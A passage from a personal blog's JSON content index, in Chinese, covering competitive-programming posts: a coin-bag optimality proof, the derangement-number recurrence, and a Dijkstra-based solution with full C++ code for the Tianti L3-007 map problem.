m/2\\rceil$ 个金币装入第一个袋子，然后递归求解</li>\n</ul>\n<h2 id=\"证明\"><a href=\"#证明\" class=\"headerlink\" title=\"证明\"></a>证明</h2><ul>\n<li>对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子</li>\n<li>按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ </li>\n<li>对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$</li>\n<li>所以我们的解法已经达到了最优</li>\n</ul>\n","slug":"洛谷2320-鬼谷子的钱袋-形式化证明","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/tags/数学/"},{"name":"递归","slug":"递归","permalink":"https://h-zex.github.io/tags/递归/"}]},{"title":"组合数之错排数","date":"2018-05-14T13:51:56.000Z","path":"2018/05/14/组合数之错排数/","text":"错排数的定义 假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能 递推公式 设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ 解释如下 假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能 假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能 为什么没有其他可能？ 因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况 ACM题 hdu2049","raw":"---\ntitle: 组合数之错排数\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-14 21:51:56\ntags:\n- 组合数\n- 错排\n- ACM\ndescription: n个元素都不在自己的位置上，有多少种可能\ncategories:\n- 数学\n\n---\n\n## 错排数的定义\n\n- 假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能\n\n## 递推公式\n\n- 设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ \n- 解释如下\n  - 假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能\n  - 假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能\n- 为什么没有其他可能？\n  - 因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况\n\n## ACM题\n\n- hdu2049","content":"<h2 id=\"错排数的定义\"><a href=\"#错排数的定义\" class=\"headerlink\" title=\"错排数的定义\"></a>错排数的定义</h2><ul>\n<li>假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能</li>\n</ul>\n<h2 id=\"递推公式\"><a href=\"#递推公式\" class=\"headerlink\" title=\"递推公式\"></a>递推公式</h2><ul>\n<li>设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ </li>\n<li>解释如下<ul>\n<li>假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能</li>\n<li>假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能</li>\n</ul>\n</li>\n<li>为什么没有其他可能？<ul>\n<li>因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"ACM题\"><a href=\"#ACM题\" class=\"headerlink\" title=\"ACM题\"></a>ACM题</h2><ul>\n<li>hdu2049</li>\n</ul>\n","slug":"组合数之错排数","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"组合数","slug":"组合数","permalink":"https://h-zex.github.io/tags/组合数/"},{"name":"错排","slug":"错排","permalink":"https://h-zex.github.io/tags/错排/"}]},{"title":"天梯L3 007 天梯地图","date":"2018-05-13T07:10:04.000Z","path":"2018/05/13/天梯L3-007-天梯地图/","text":"题目 输入示例一123456789101112131415161710 150 1 0 1 18 0 0 1 14 8 1 1 15 4 0 2 35 9 1 1 40 6 0 1 17 3 1 1 28 3 1 1 22 5 0 2 22 1 1 1 11 5 0 1 31 4 0 1 19 7 1 1 33 1 0 2 56 3 1 2 15 3 输出示例一12Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3Distance = 3: 5 =&gt; 1 =&gt; 3 输入示例二12345678910117 90 4 1 1 11 6 1 3 12 6 1 1 12 5 1 2 23 0 0 1 13 1 1 3 13 2 1 2 14 5 0 2 26 5 1 2 13 5 输出示例二1Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5 Dijstra算法 bfs+优先队列其实就是dijstra算法 dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ Dijstra找出所有最短路径 从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。 具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如vector&lt;int&gt; parent[600] ，则parent[n] 代表的vector就是编号为n的节点的parent list 然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。 需要注意的点不可以这样寻找同代价的不同parent 节点 代码 12345678910111213141516// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价// 其实edge t就代表了节点mestruct Edge_t &#123; int me; int p; int t; Edge_t(int m, int h, int y) : me(m), p(h), t(y) &#123;&#125; bool operator&lt;(const Edge_t &amp;x) const &#123; return x.t &lt; this-&gt;t; &#125;&#125;;while (!que.empty()) &#123; Edge_t t = que.top(); que.pop(); while (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me) ...&#125; 可能某Edge h 确实跟pop出来的Edge t是代表的是同一个节点——也就是h.me==t.me ，并且代价相同。但是在堆中，还有同等代价的Edge p，其终点不是t.me ——也就是p.me!=t.me ，然后该Edge p 在堆中的位置处在Edge h 前面，所以上面那个while就没办法获得Edge h 从而无法获取完整的parent list。 另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出Edge t 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里 考虑自循环边 直接判断要求某点A邻接的点不与A相同即可实现 因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意 dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法 INF的取值要注意 dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得INF+weight[i]不再是INF 自己生成数据对拍时 要注意不要生成多重边，网上很多ac的代码都是不支持多重边的 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define INF 0x3f3f3f3fusing namespace std;struct Node &#123; int index; vector&lt;int&gt; adj;&#125;;Node v[600];int length[600][600]; // length[i][j]记录从node i到node j的lengthint TIME[600][600]; // TIME[i][j]记录从node i到node j的用时vector&lt;int&gt; tp[600];// node's parent listint tpResult[600];// 最终的node的parentint BEGIN, END; // 题目输入的天梯队员的起点和要到达的终点int vertexCnt, edgeCnt;int dijstra(int weight[][600]);int DFS(bool isLength);void outp(int f, int index);int main(int argc, char** argv) &#123; int n, m; while (~scanf(\"%d%d\", &amp;n, &amp;m)) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; TIME[i][j] = INF; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; length[i][j] = INF; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; v[i].index = i; v[i].adj.clear(); &#125; for (int i = 0; i &lt; n; i++) &#123; tp[i].clear(); &#125; vertexCnt = n, edgeCnt = m; int v1, v2, one, l, t; for (int i = 0; i &lt; m; i++) &#123; scanf(\"%d%d%d%d%d\", &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t); v[v1].adj.push_back(v2); // 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可 length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l; TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t; if (!one) &#123; v[v2].adj.push_back(v1); length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l; TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t; &#125; &#125; scanf(\"%d%d\", &amp;BEGIN, &amp;END); if (BEGIN == END) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; \"0\" &lt;&lt; \"; Distance = \" &lt;&lt; \"0\" &lt;&lt; \": \"; cout &lt;&lt; BEGIN &lt;&lt; \" =&gt; \" &lt;&lt; END &lt;&lt; endl; continue; &#125; if (n == 2) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; TIME[BEGIN][END] &lt;&lt; \"; Distance = \" &lt;&lt; length[BEGIN][END] &lt;&lt; \": \"; cout &lt;&lt; BEGIN &lt;&lt; \" =&gt; \" &lt;&lt; END &lt;&lt; endl; continue; &#125; int timeEND = dijstra(TIME);// outp(END, 0); DFS(false); vector&lt;int&gt; r1, r2; r1.push_back(END); // 以下这种构造路径的方式是建立在起点不同于终点的情况下 int tmp_tp = tpResult[END]; r1.push_back(tmp_tp); while (tmp_tp != BEGIN) &#123; tmp_tp = tpResult[tmp_tp]; r1.push_back(tmp_tp); &#125; reverse(r1.begin(), r1.end()); for (int i = 0; i &lt; n; i++) &#123; tp[i].clear(); &#125; int lenEND = dijstra(length);// outp(END, 0); DFS(true); r2.push_back(END); tmp_tp = tpResult[END]; r2.push_back(tmp_tp); while (tmp_tp != BEGIN) &#123; tmp_tp = tpResult[tmp_tp]; r2.push_back(tmp_tp); &#125; reverse(r2.begin(), r2.end()); bool isSame = false; if (r1.size() == r2.size()) &#123; isSame = true; for (int i = 0; i &lt; r1.size(); i++) &#123; isSame = (r1[i] == r2[i]) &amp;&amp; isSame; &#125; &#125; if (isSame) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; timeEND &lt;&lt; \"; Distance = \" &lt;&lt; lenEND &lt;&lt; \": \"; for (int i = 0; i &lt; r1.size() - 1; i++) &#123; cout &lt;&lt; r1[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r1[r1.size() - 1] &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"Time = \" &lt;&lt; timeEND &lt;&lt; \": \"; for (int i = 0; i &lt; r1.size() - 1; i++) &#123; cout &lt;&lt; r1[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r1[r1.size() - 1] &lt;&lt; endl; cout &lt;&lt; \"Distance = \" &lt;&lt; lenEND &lt;&lt; \": \"; for (int i = 0; i &lt; r2.size() - 1; i++) &#123; cout &lt;&lt; r2[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r2[r2.size() - 1] &lt;&lt; endl; &#125; &#125;&#125;// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价struct Edge_t &#123; int me; int p; int t; Edge_t(int m, int h, int y) : me(m), p(h), t(y) &#123;&#125; bool operator&lt;(const Edge_t &amp;x) const &#123; return x.t &lt; this-&gt;t; &#125;&#125;;// bfs+优先队列其实就是dijstra算法// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到// 所以result set只会有node被加进去而不会有node被踢出去// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，int dijstra(int weight[][600]) &#123; int resWei[600]; priority_queue&lt;Edge_t&gt; que; que.push(Edge_t(BEGIN, 0, 0));// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0 int cnt = 0; bool visit[vertexCnt]; // 记录某点是否已经加入到dijstra的result set里 memset(visit, 0, sizeof(visit) * sizeof(bool)); while (!que.empty()) &#123; Edge_t t = que.top(); que.pop(); // 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里 if (visit[t.me]) &#123; assert(resWei[t.me] &lt;= t.t); if (resWei[t.me] == t.t) &#123; tp[t.me].push_back(t.p); &#125; continue; &#125; visit[t.me] = true; tp[t.me].push_back(t.p); resWei[t.me] = t.t; const vector&lt;int&gt; &amp;adj = v[t.me].adj; int al = adj.size(); for (int i = 0; i &lt; al; i++) &#123; if (adj[i] == t.me) continue; que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]])); &#125; &#125; return resWei[END];&#125;int dp[600];bool dpVisit[600];static int __dfs(int f, bool isLength);int DFS(bool isLength) &#123; memset(dp, 0xff, sizeof(dp)); memset(tpResult, 0, sizeof(tpResult)); memset(dpVisit, 0, sizeof(dpVisit)); return __dfs(END, isLength);&#125;static int __dfs(int f, bool isLength) &#123; if (dp[f] &gt; -1) &#123; return dp[f]; &#125; if (f == BEGIN) &#123; return 0; &#125; const vector&lt;int&gt; &amp;t = tp[f]; int result = INF; for (int i = 0; i &lt; t.size(); i++) &#123; if(t[i]==f) continue; if (dpVisit[t[i]]) // 代表该节点在这条路径上已经被访问过 continue; dpVisit[f] = true; int p = __dfs(t[i], isLength) + (isLength ? 1 : length[t[i]][f]); dpVisit[f] = false; if (p &lt; result) &#123; tpResult[f] = t[i]; result = p; &#125; &#125; dp[f] = result; return result;&#125;int path[600];bool outpVisit[600];void outp(int f, int index) &#123; outpVisit[f] = true; if (f == BEGIN) &#123; cout &lt;&lt; \"outp: \"; for (int i = 0; i &lt; index; i++) &#123; cout &lt;&lt; path[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; outpVisit[f] = true; return; &#125; path[index] = f; const vector&lt;int&gt; &amp;t = tp[f]; for (int i = 0; i &lt; t.size(); i++) &#123; if (outpVisit[t[i]])// means that 前辈们已经访问过了，再访问就成环了 continue; outp(t[i], index + 1); &#125; outpVisit[f] = false; return;&#125;","raw":"---\ntitle: 天梯L3 007 天梯地图\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-13 15:10:04\ntags:\n- Dijstra最短路\n- 天梯赛\ndescription: Dijstra最短路变形\ncategories:\n- 算法\n---\n\n## 题目\n\n{% asset_img 1.png %}\n\n#### 输入示例一\n\n```\n10 15\n0 1 0 1 1\n8 0 0 1 1\n4 8 1 1 1\n5 4 0 2 3\n5 9 1 1 4\n0 6 0 1 1\n7 3 1 1 2\n8 3 1 1 2\n2 5 0 2 2\n2 1 1 1 1\n1 5 0 1 3\n1 4 0 1 1\n9 7 1 1 3\n3 1 0 2 5\n6 3 1 2 1\n5 3\n```\n\n#### 输出示例一\n\n```\nTime = 6: 5 => 4 => 8 => 3\nDistance = 3: 5 => 1 => 3\n```\n\n#### 输入示例二\n\n```\n7 9\n0 4 1 1 1\n1 6 1 3 1\n2 6 1 1 1\n2 5 1 2 2\n3 0 0 1 1\n3 1 1 3 1\n3 2 1 2 1\n4 5 0 2 2\n6 5 1 2 1\n3 5\n```\n\n#### 输出示例二\n\n```\nTime = 3; Distance = 4: 3 => 2 => 5\n```\n\n## Dijstra算法\n\n- bfs+优先队列其实就是dijstra算法\n- dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去\n- 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ \n\n## Dijstra找出所有最短路径\n\n- 从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。\n- 具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如`vector<int> parent[600]` ，则`parent[n]` 代表的vector就是编号为n的节点的parent list\n- 然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。\n\n## 需要注意的点\n\n#### 不可以这样寻找同代价的不同parent 节点\n\n- 代码\n\n  ```cpp\n  // 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价\n  // 其实edge t就代表了节点me\n  struct Edge_t {\n      int me;\n      int p;\n      int t;\n      Edge_t(int m, int h, int y) : me(m), p(h), t(y) {} \n      bool operator<(const Edge_t &x) const { return x.t < this->t; }\n  };\n\n  while (!que.empty()) {\n      Edge_t t = que.top();\n      que.pop();\n      while (!que.empty() && que.top().t == t.t && que.top().me == t.me)\n      ...\n  }\n  ```\n\n- 可能某`Edge h` 确实跟pop出来的`Edge t`是代表的是同一个节点——也就是`h.me==t.me` ，并且代价相同。但是在堆中，还有同等代价的`Edge p`，其终点不是`t.me` ——也就是`p.me!=t.me` ，然后该`Edge p` 在堆中的位置处在`Edge h` 前面，所以上面那个while就没办法获得`Edge h` 从而无法获取完整的parent list。\n\n- 另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出`Edge t` 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里\n\n#### 考虑自循环边\n\n- 直接判断要求某点A邻接的点不与A相同即可实现\n\n#### 因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\n\n- dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法\n\n#### INF的取值要注意\n\n- dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得`INF+weight[i]`不再是INF\n\n#### 自己生成数据对拍时\n\n- 要注意不要生成多重边，网上很多ac的代码都是不支持多重边的\n\n## 代码\n\n```cpp\n#include <algorithm>\n#include <cassert>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <queue>\n#include <vector>\n#define INF 0x3f3f3f3f\n\nusing namespace std;\nstruct Node {\n    int index;\n    vector<int> adj;\n};\nNode v[600];\nint length[600][600]; // length[i][j]记录从node i到node j的length\nint TIME[600][600]; // TIME[i][j]记录从node i到node j的用时\nvector<int> tp[600];// node's parent list\nint tpResult[600];// 最终的node的parent\n\nint BEGIN, END; // 题目输入的天梯队员的起点和要到达的终点\nint vertexCnt, edgeCnt;\n\nint dijstra(int weight[][600]);\nint DFS(bool isLength);\nvoid outp(int f, int index);\n\nint main(int argc, char** argv) {\n    int n, m;\n    while (~scanf(\"%d%d\", &n, &m)) {\n        for (int i = 0; i < n; i++) {\n            for (int j = 0; j < n; j++) {\n                TIME[i][j] = INF;\n            }\n        }\n        for (int i = 0; i < n; i++) {\n            for (int j = 0; j < n; j++) {\n                length[i][j] = INF;\n            }\n        }\n        for (int i = 0; i < n; i++) {\n            v[i].index = i;\n            v[i].adj.clear();\n        }\n        for (int i = 0; i < n; i++) {\n            tp[i].clear();\n        }\n\n        vertexCnt = n, edgeCnt = m;\n        int v1, v2, one, l, t;\n        for (int i = 0; i < m; i++) {\n            scanf(\"%d%d%d%d%d\", &v1, &v2, &one, &l, &t);\n            v[v1].adj.push_back(v2);\n            // 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可\n            length[v1][v2] = length[v1][v2] < l ? length[v1][v2] : l;\n            TIME[v1][v2] = TIME[v1][v2] < t ? TIME[v1][v2] : t;\n            if (!one) {\n                v[v2].adj.push_back(v1);\n                length[v2][v1] = length[v2][v1] < l ? length[v2][v1] : l;\n                TIME[v2][v1] = TIME[v2][v1] < t ? TIME[v2][v1] : t;\n            }\n        }\n        scanf(\"%d%d\", &BEGIN, &END);\n        if (BEGIN == END) {\n            cout << \"Time = \"\n                 << \"0\"\n                 << \"; Distance = \"\n                 << \"0\"\n                 << \": \";\n            cout << BEGIN << \" => \" << END << endl;\n            continue;\n        }\n        if (n == 2) {\n            cout << \"Time = \" << TIME[BEGIN][END] << \"; Distance = \" << length[BEGIN][END] << \": \";\n            cout << BEGIN << \" => \" << END << endl;\n            continue;\n        }\n\n        int timeEND = dijstra(TIME);\n//        outp(END, 0);\n        DFS(false);\n        vector<int> r1, r2;\n        r1.push_back(END);\n        // 以下这种构造路径的方式是建立在起点不同于终点的情况下\n        int tmp_tp = tpResult[END];\n        r1.push_back(tmp_tp);\n        while (tmp_tp != BEGIN) {\n            tmp_tp = tpResult[tmp_tp];\n            r1.push_back(tmp_tp);\n        }\n        reverse(r1.begin(), r1.end());\n\n        for (int i = 0; i < n; i++) {\n            tp[i].clear();\n        }\n        int lenEND = dijstra(length);\n//        outp(END, 0);\n        DFS(true);\n        r2.push_back(END);\n        tmp_tp = tpResult[END];\n        r2.push_back(tmp_tp);\n        while (tmp_tp != BEGIN) {\n            tmp_tp = tpResult[tmp_tp];\n            r2.push_back(tmp_tp);\n        }\n        reverse(r2.begin(), r2.end());\n\n        bool isSame = false;\n        if (r1.size() == r2.size()) {\n            isSame = true;\n            for (int i = 0; i < r1.size(); i++) {\n                isSame = (r1[i] == r2[i]) && isSame;\n            }\n        }\n        if (isSame) {\n            cout << \"Time = \" << timeEND << \"; Distance = \" << lenEND << \": \";\n            for (int i = 0; i < r1.size() - 1; i++) {\n                cout << r1[i] << \" => \";\n            }\n            cout << r1[r1.size() - 1] << endl;\n        } else {\n            cout << \"Time = \" << timeEND << \": \";\n            for (int i = 0; i < r1.size() - 1; i++) {\n                cout << r1[i] << \" => \";\n            }\n            cout << r1[r1.size() - 1] << endl;\n            cout << \"Distance = \" << lenEND << \": \";\n            for (int i = 0; i < r2.size() - 1; i++) {\n                cout << r2[i] << \" => \";\n            }\n            cout << r2[r2.size() - 1] << endl;\n        }\n    }\n}\n\n// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价\nstruct Edge_t {\n    int me;\n    int p;\n    int t;\n    Edge_t(int m, int h, int y) : me(m), p(h), t(y) {} \n    bool operator<(const Edge_t &x) const { return x.t < this->t; }\n};\n\n// bfs+优先队列其实就是dijstra算法\n// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到\n// 所以result set只会有node被加进去而不会有node被踢出去\n// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，\nint dijstra(int weight[][600]) {\n    int resWei[600];\n    priority_queue<Edge_t> que;\n    que.push(Edge_t(BEGIN, 0, 0));// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0\n    int cnt = 0;\n    bool visit[vertexCnt];  // 记录某点是否已经加入到dijstra的result set里\n    memset(visit, 0, sizeof(visit) * sizeof(bool));\n    while (!que.empty()) {\n        Edge_t t = que.top();\n        que.pop();\n        // 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里\n        if (visit[t.me]) {\n            assert(resWei[t.me] <= t.t);\n            if (resWei[t.me] == t.t) {\n                tp[t.me].push_back(t.p);\n            }\n            continue;\n        }\n        visit[t.me] = true;\n        tp[t.me].push_back(t.p);\n        resWei[t.me] = t.t;\n        const vector<int> &adj = v[t.me].adj;\n        int al = adj.size();\n        for (int i = 0; i < al; i++) {\n            if (adj[i] == t.me)\n                continue;\n            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));\n        }\n    }\n    return resWei[END];\n}\n\nint dp[600];\nbool dpVisit[600];\nstatic int __dfs(int f, bool isLength);\nint DFS(bool isLength) {\n    memset(dp, 0xff, sizeof(dp));\n    memset(tpResult, 0, sizeof(tpResult));\n    memset(dpVisit, 0, sizeof(dpVisit));\n    return __dfs(END, isLength);\n}\nstatic int __dfs(int f, bool isLength) {\n    if (dp[f] > -1) {\n        return dp[f];\n    }\n    if (f == BEGIN) {\n        return 0;\n    }\n    const vector<int> &t = tp[f];\n    int result = INF;\n    for (int i = 0; i < t.size(); i++) {\n        if(t[i]==f)\n            continue;\n        if (dpVisit[t[i]])  // 代表该节点在这条路径上已经被访问过\n            continue;\n        dpVisit[f] = true;\n        int p = __dfs(t[i], isLength) + (isLength ? 1 : length[t[i]][f]);\n        dpVisit[f] = false;\n        if (p < result) {\n            tpResult[f] = t[i];\n            result = p;\n        }\n    }\n    dp[f] = result;\n    return result;\n}\n\nint path[600];\nbool outpVisit[600];\nvoid outp(int f, int index) {\n    outpVisit[f] = true;\n    if (f == BEGIN) {\n        cout << \"outp: \";\n        for (int i = 0; i < index; i++) {\n            cout << path[i] << \" \";\n        }\n        cout << endl;\n        outpVisit[f] = true;\n        return;\n    }\n    path[index] = f;\n    const vector<int> &t = tp[f];\n    for (int i = 0; i < t.size(); i++) {\n        if (outpVisit[t[i]])// means that 前辈们已经访问过了，再访问就成环了\n            continue;\n        outp(t[i], index + 1);\n    }\n    outpVisit[f] = false;\n    return;\n}\n```","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><img src=\"/2018/05/13/天梯L3-007-天梯地图/1.png\">\n<h4 id=\"输入示例一\"><a href=\"#输入示例一\" class=\"headerlink\" title=\"输入示例一\"></a>输入示例一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10 15</span><br><span class=\"line\">0 1 0 1 1</span><br><span class=\"line\">8 0 0 1 1</span><br><span class=\"line\">4 8 1 1 1</span><br><span class=\"line\">5 4 0 2 3</span><br><span class=\"line\">5 9 1 1 4</span><br><span class=\"line\">0 6 0 1 1</span><br><span class=\"line\">7 3 1 1 2</span><br><span class=\"line\">8 3 1 1 2</span><br><span class=\"line\">2 5 0 2 2</span><br><span class=\"line\">2 1 1 1 1</span><br><span class=\"line\">1 5 0 1 3</span><br><span class=\"line\">1 4 0 1 1</span><br><span class=\"line\">9 7 1 1 3</span><br><span class=\"line\">3 1 0 2 5</span><br><span class=\"line\">6 3 1 2 1</span><br><span class=\"line\">5 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出示例一\"><a href=\"#输出示例一\" class=\"headerlink\" title=\"输出示例一\"></a>输出示例一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3</span><br><span class=\"line\">Distance = 3: 5 =&gt; 1 =&gt; 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"输入示例二\"><a href=\"#输入示例二\" class=\"headerlink\" title=\"输入示例二\"></a>输入示例二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 